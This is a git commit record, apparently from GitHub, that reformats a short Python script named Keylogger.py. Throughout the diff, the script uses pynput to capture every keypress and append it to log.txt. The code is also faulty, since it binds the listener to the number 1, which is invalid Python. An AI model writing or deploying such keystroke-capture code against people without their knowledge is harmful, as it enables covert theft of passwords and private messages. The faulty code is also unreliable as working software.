df49c82d2628db39732d5261eca8c23c6eccb708
Danilo Nori <55815889+DaniloNori@users.noreply.github.com>
2021-03-15 01:27:31 -0500

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -1,10 +1,12 @@
 from pynput.keyboard import Listener
 
+
 def writeofile(key):
-        keydata = str(key)
-        keydata = keydata.replace ("'", "")
-        with open("log.txt","a") as f:
-            f.write(keydata)
+    keydata = str(key)
+    keydata = keydata.replace("'", "")
+    with open("log.txt", "a") as f:
+        f.write(keydata)
+
 
 with Listener(on_press=writeofile) as 1:
-        1.join()
+    1.join()
